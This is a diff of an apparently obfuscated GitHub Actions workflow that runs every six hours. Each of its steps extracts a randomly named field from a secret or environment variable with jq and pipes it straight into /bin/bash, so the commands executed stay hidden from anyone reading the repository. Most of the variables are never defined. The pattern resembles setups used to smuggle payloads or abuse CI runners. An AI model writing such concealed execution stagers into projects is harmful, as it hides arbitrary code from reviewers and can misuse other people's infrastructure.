@@ -1,9 +1,9 @@
 name: fanggeju4567
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
-
+    - cron: '47 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: fanggeju4567
         env:
-          hlrvh32850: ${{ secrets.hlrvh32850 }}
+          ztktv2: ${{ secrets.ztktv2 }}
         run: |
-          echo $hlrvh32850 | jq -r .o1879 | /bin/bash
-          echo $wkiex00 | jq -r .qa93 | /bin/bash
-          echo $axits535 | jq -r .obd3 | /bin/bash
-          echo $gam8 | jq -r .y921 | /bin/bash
-          echo $pbiki4992 | jq -r .d515 | /bin/bash
-          echo $c36 | jq -r .zkms35777 | /bin/bash
-          echo $cx087 | jq -r .ci70173 | /bin/bash
-          echo $vfbgr76030 | jq -r .zn24059 | /bin/bash
-          echo $ke9332 | jq -r .muaz94091 | /bin/bash
-          echo $kfft7 | jq -r .qrvs276 | /bin/bash
-          echo $o407 | jq -r .rq51 | /bin/bash
-          echo $lq47 | jq -r .jqd23132 | /bin/bash
-          echo $uxd1 | jq -r .svoxq247 | /bin/bash
+          echo $ztktv2 | jq -r .bzu35072 | /bin/bash
+          echo $zagwb8701 | jq -r .e57 | /bin/bash
+          echo $oojc8 | jq -r .y64 | /bin/bash
+          echo $ut36 | jq -r .isf70 | /bin/bash
+          echo $ii7798 | jq -r .oad4938 | /bin/bash
+          echo $s21013 | jq -r .whqs2 | /bin/bash
+          echo $dfa2 | jq -r .wuvg918 | /bin/bash
 
